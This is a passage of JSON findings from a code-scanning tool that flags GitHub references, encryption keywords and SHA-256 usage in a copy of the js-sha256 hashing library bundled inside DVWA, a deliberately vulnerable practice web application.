        "sample": "buffer",
        "excerpt": "\n  var nodeWrap = function (method, is224) {\n    var crypto = eval(&quot;require(&#39;crypto&#39;)&quot;);\n    var Buffer = eval(&quot;require(&#39;buffer&#39;).Buffer&quot;);\n    var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\n    var nodeMethod = function (message) {\n      if (typeof message === &#39;string&#39;) {\n        return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n      } else {\n",
        "startLocationLine": 84,
        "startLocationColumn": 24,
        "endLocationLine": 84,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "/**\n * [js-sha256]{@link https://github.com/emn178/js-sha256}\n *\n * @version 0.9.0\n * @author Chen, Yi-Cyuan [emn178@gmail.com]\n * @copyright Chen, Yi-Cyuan 2014-2017\n * @license MIT\n",
        "startLocationLine": 2,
        "startLocationColumn": 30,
        "endLocationLine": 2,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI007600",
        "ruleName": "Cryptography: Encryption (General)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "encrypt|decrypt|cipher|crypt|symmmetric",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Encryption.General"
        ],
        "sample": "crypt",
        "excerpt": "  };\n\n  var nodeWrap = function (method, is224) {\n    var crypto = eval(&quot;require(&#39;crypto&#39;)&quot;);\n    var Buffer = eval(&quot;require(&#39;buffer&#39;).Buffer&quot;);\n    var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\n    var nodeMethod = function (message) {\n      if (typeof message === &#39;string&#39;) {\n        return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n",
        "startLocationLine": 83,
        "startLocationColumn": 9,
        "endLocationLine": 83,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI007600",
        "ruleName": "Cryptography: Encryption (General)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "encrypt|decrypt|cipher|crypt|symmmetric",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Encryption.General"
        ],
        "sample": "crypt",
        "excerpt": "  };\n\n  var nodeWrap = function (method, is224) {\n    var crypto = eval(&quot;require(&#39;crypto&#39;)&quot;);\n    var Buffer = eval(&quot;require(&#39;buffer&#39;).Buffer&quot;);\n    var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\n    var nodeMethod = function (message) {\n      if (typeof message === &#39;string&#39;) {\n        return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n",
        "startLocationLine": 83,
        "startLocationColumn": 33,
        "endLocationLine": 83,
        "endLocationColumn": 38
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI007600",
        "ruleName": "Cryptography: Encryption (General)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "encrypt|decrypt|cipher|crypt|symmmetric",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Encryption.General"
        ],
        "sample": "crypt",
        "excerpt": "var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\nvar nodeMethod = function (message) {\n  if (typeof message === &#39;string&#39;) {\n    return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n  } else {\n    if (message === null || message === undefined) {\n      throw new Error(ERROR);\n    } else if (message.constructor === ArrayBuffer) {\n      message = new Uint8Array(message);\n",
        "startLocationLine": 88,
        "startLocationColumn": 16,
        "endLocationLine": 88,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI007600",
        "ruleName": "Cryptography: Encryption (General)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "encrypt|decrypt|cipher|crypt|symmmetric",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Encryption.General"
        ],
        "sample": "crypt",
        "excerpt": "  }\n  if (Array.isArray(message) || ArrayBuffer.isView(message) ||\n    message.constructor === Buffer) {\n    return crypto.createHash(algorithm).update(new Buffer(message)).digest(&#39;hex&#39;);\n  } else {\n    return method(message);\n  }\n};\nreturn nodeMethod;\n",
        "startLocationLine": 98,
        "startLocationColumn": 16,
        "endLocationLine": 98,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "var ERROR = &#39;input is invalid type&#39;;\nvar WINDOW = typeof window === &#39;object&#39;;\nvar root = WINDOW ? window : {};\nif (root.JS_SHA256_NO_WINDOW) {\n  WINDOW = false;\n}\nvar WEB_WORKER = !WINDOW &amp;&amp; typeof self === &#39;object&#39;;\nvar NODE_JS = !root.JS_SHA256_NO_NODE_JS &amp;&amp; typeof process === &#39;object&#39; &amp;&amp; process.versions &amp;&amp; process.versions.node;\nif (NODE_JS) {\n",
        "startLocationLine": 16,
        "startLocationColumn": 15,
        "endLocationLine": 16,
        "endLocationColumn": 19
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "  WINDOW = false;\n}\nvar WEB_WORKER = !WINDOW &amp;&amp; typeof self === &#39;object&#39;;\nvar NODE_JS = !root.JS_SHA256_NO_NODE_JS &amp;&amp; typeof process === &#39;object&#39; &amp;&amp; process.versions &amp;&amp; process.versions.node;\nif (NODE_JS) {\n  root = global;\n} else if (WEB_WORKER) {\n  root = self;\n}\n",
        "startLocationLine": 20,
        "startLocationColumn": 26,
        "endLocationLine": 20,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "} else if (WEB_WORKER) {\n  root = self;\n}\nvar COMMON_JS = !root.JS_SHA256_NO_COMMON_JS &amp;&amp; typeof module === &#39;object&#39; &amp;&amp; module.exports;\nvar AMD = typeof define === &#39;function&#39; &amp;&amp; define.amd;\nvar ARRAY_BUFFER = !root.JS_SHA256_NO_ARRAY_BUFFER &amp;&amp; typeof ArrayBuffer !== &#39;undefined&#39;;\nvar HEX_CHARS = &#39;0123456789abcdef&#39;.split(&#39;&#39;);\nvar EXTRA = [-2147483648, 8388608, 32768, 128];\nvar SHIFT = [24, 16, 8, 0];\n",
        "startLocationLine": 26,
        "startLocationColumn": 28,
        "endLocationLine": 26,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "}\nvar COMMON_JS = !root.JS_SHA256_NO_COMMON_JS &amp;&amp; typeof module === &#39;object&#39; &amp;&amp; module.exports;\nvar AMD = typeof define === &#39;function&#39; &amp;&amp; define.amd;\nvar ARRAY_BUFFER = !root.JS_SHA256_NO_ARRAY_BUFFER &amp;&amp; typeof ArrayBuffer !== &#39;undefined&#39;;\nvar HEX_CHARS = &#39;0123456789abcdef&#39;.split(&#39;&#39;);\nvar EXTRA = [-2147483648, 8388608, 32768, 128];\nvar SHIFT = [24, 16, 8, 0];\nvar K = [\n  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,\n",
        "startLocationLine": 28,
        "startLocationColumn": 31,
        "endLocationLine": 28,
        "endLocationColumn": 35
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "\n  var blocks = [];\n\n  if (root.JS_SHA256_NO_NODE_JS || !Array.isArray) {\n    Array.isArray = function (obj) {\n      return Object.prototype.toString.call(obj) === &#39;[object Array]&#39;;\n    };\n  }\n\n",
        "startLocationLine": 46,
        "startLocationColumn": 15,
        "endLocationLine": 46,
        "endLocationColumn": 19
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "    };\n  }\n\n  if (ARRAY_BUFFER &amp;&amp; (root.JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW || !ArrayBuffer.isView)) {\n    ArrayBuffer.isView = function (obj) {\n      return typeof obj === &#39;object&#39; &amp;&amp; obj.buffer &amp;&amp; obj.buffer.constructor === ArrayBuffer;\n    };\n  }\n\n",
        "startLocationLine": 52,
        "startLocationColumn": 32,
        "endLocationLine": 52,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "\n  var createOutputMethod = function (outputType, is224) {\n    return function (message) {\n      return new Sha256(is224, true).update(message)[outputType]();\n    };\n  };\n\n  var createMethod = function (is224) {\n    var method = createOutputMethod(&#39;hex&#39;, is224);\n",
        "startLocationLine": 60,
        "startLocationColumn": 18,
        "endLocationLine": 60,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "  method = nodeWrap(method, is224);\n}\nmethod.create = function () {\n  return new Sha256(is224);\n};\nmethod.update = function (message) {\n  return method.create().update(message);\n};\nfor (var i = 0; i &lt; OUTPUT_TYPES.length; ++i) {\n",
        "startLocationLine": 70,
        "startLocationColumn": 18,
        "endLocationLine": 70,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "var nodeWrap = function (method, is224) {\n  var crypto = eval(&quot;require(&#39;crypto&#39;)&quot;);\n  var Buffer = eval(&quot;require(&#39;buffer&#39;).Buffer&quot;);\n  var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\n  var nodeMethod = function (message) {\n    if (typeof message === &#39;string&#39;) {\n      return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n    } else {\n      if (message === null || message === undefined) {\n",
        "startLocationLine": 85,
        "startLocationColumn": 30,
        "endLocationLine": 85,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "var nodeWrap = function (method, is224) {\n  var crypto = eval(&quot;require(&#39;crypto&#39;)&quot;);\n  var Buffer = eval(&quot;require(&#39;buffer&#39;).Buffer&quot;);\n  var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\n  var nodeMethod = function (message) {\n    if (typeof message === &#39;string&#39;) {\n      return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n    } else {\n      if (message === null || message === undefined) {\n",
        "startLocationLine": 85,
        "startLocationColumn": 41,
        "endLocationLine": 85,
        "endLocationColumn": 45
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "\n  var createHmacOutputMethod = function (outputType, is224) {\n    return function (key, message) {\n      return new HmacSha256(key, is224, true).update(message)[outputType]();\n    };\n  };\n\n  var createHmacMethod = function (is224) {\n    var method = createHmacOutputMethod(&#39;hex&#39;, is224);\n",
        "startLocationLine": 108,
        "startLocationColumn": 22,
        "endLocationLine": 108,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "var createHmacMethod = function (is224) {\n  var method = createHmacOutputMethod(&#39;hex&#39;, is224);\n  method.create = function (key) {\n    return new HmacSha256(key, is224);\n  };\n  method.update = function (key, message) {\n    return method.create(key).update(message);\n  };\n  for (var i = 0; i &lt; OUTPUT_TYPES.length; ++i) {\n",
        "startLocationLine": 115,
        "startLocationColumn": 22,
        "endLocationLine": 115,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    return method;\n  };\n\n  function Sha256(is224, sharedMemory) {\n    if (sharedMemory) {\n      blocks[0] = blocks[16] = blocks[1] = blocks[2] = blocks[3] =\n        blocks[4] = blocks[5] = blocks[6] = blocks[7] =\n        blocks[8] = blocks[9] = blocks[10] = blocks[11] =\n        blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;\n",
        "startLocationLine": 127,
        "startLocationColumn": 12,
        "endLocationLine": 127,
        "endLocationColumn": 16
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    this.is224 = is224;\n  }\n\n  Sha256.prototype.update = function (message) {\n    if (this.finalized) {\n      return;\n    }\n    var notString, type = typeof message;\n    if (type !== &#39;string&#39;) {\n",
        "startLocationLine": 164,
        "startLocationColumn": 3,
        "endLocationLine": 164,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    return this;\n  };\n\n  Sha256.prototype.finalize = function () {\n    if (this.finalized) {\n      return;\n    }\n    this.finalized = true;\n    var blocks = this.blocks, i = this.lastByteIndex;\n",
        "startLocationLine": 241,
        "startLocationColumn": 3,
        "endLocationLine": 241,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    this.hash();\n  };\n\n  Sha256.prototype.hash = function () {\n    var a = this.h0, b = this.h1, c = this.h2, d = this.h3, e = this.h4, f = this.h5, g = this.h6,\n      h = this.h7, blocks = this.blocks, j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;\n\n    for (j = 16; j &lt; 64; ++j) {\n      // rightrotate\n",
        "startLocationLine": 265,
        "startLocationColumn": 3,
        "endLocationLine": 265,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    this.h7 = this.h7 + h &lt;&lt; 0;\n  };\n\n  Sha256.prototype.hex = function () {\n    this.finalize();\n\n    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,\n      h6 = this.h6, h7 = this.h7;\n\n",
        "startLocationLine": 343,
        "startLocationColumn": 3,
        "endLocationLine": 343,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    return hex;\n  };\n\n  Sha256.prototype.toString = Sha256.prototype.hex;\n\n  Sha256.prototype.digest = function () {\n    this.finalize();\n\n    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,\n",
        "startLocationLine": 386,
        "startLocationColumn": 3,
        "endLocationLine": 386,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    return hex;\n  };\n\n  Sha256.prototype.toString = Sha256.prototype.hex;\n\n  Sha256.prototype.digest = function () {\n    this.finalize();\n\n    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,\n",
        "startLocationLine": 386,
        "startLocationColumn": 31,
        "endLocationLine": 386,
        "endLocationColumn": 35
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "\n  Sha256.prototype.toString = Sha256.prototype.hex;\n\n  Sha256.prototype.digest = function () {\n    this.finalize();\n\n    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,\n      h6 = this.h6, h7 = this.h7;\n\n",
        "startLocationLine": 388,
        "startLocationColumn": 3,
        "endLocationLine": 388,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    return arr;\n  };\n\n  Sha256.prototype.array = Sha256.prototype.digest;\n\n  Sha256.prototype.arrayBuffer = function () {\n    this.finalize();\n\n    var buffer = new ArrayBuffer(this.is224 ? 28 : 32);\n",
        "startLocationLine": 409,
        "startLocationColumn": 3,
        "endLocationLine": 409,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    return arr;\n  };\n\n  Sha256.prototype.array = Sha256.prototype.digest;\n\n  Sha256.prototype.arrayBuffer = function () {\n    this.finalize();\n\n    var buffer = new ArrayBuffer(this.is224 ? 28 : 32);\n",
        "startLocationLine": 409,
        "startLocationColumn": 28,
        "endLocationLine": 409,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "\n  Sha256.prototype.array = Sha256.prototype.digest;\n\n  Sha256.prototype.arrayBuffer = function () {\n    this.finalize();\n\n    var buffer = new ArrayBuffer(this.is224 ? 28 : 32);\n    var dataView = new DataView(buffer);\n    dataView.setUint32(0, this.h0);\n",
        "startLocationLine": 411,
        "startLocationColumn": 3,
        "endLocationLine": 411,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "Sha2",
        "excerpt": "    return buffer;\n  };\n\n  function HmacSha256(key, is224, sharedMemory) {\n    var i, type = typeof key;\n    if (type === &#39;string&#39;) {\n      var bytes = [], length = key.length, index = 0, code;\n      for (i = 0; i &lt; length; ++i) {\n        code = key.charCodeAt(i);\n",
        "startLocationLine": 429,
        "startLocationColumn": 16,
        "endLocationLine": 429,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
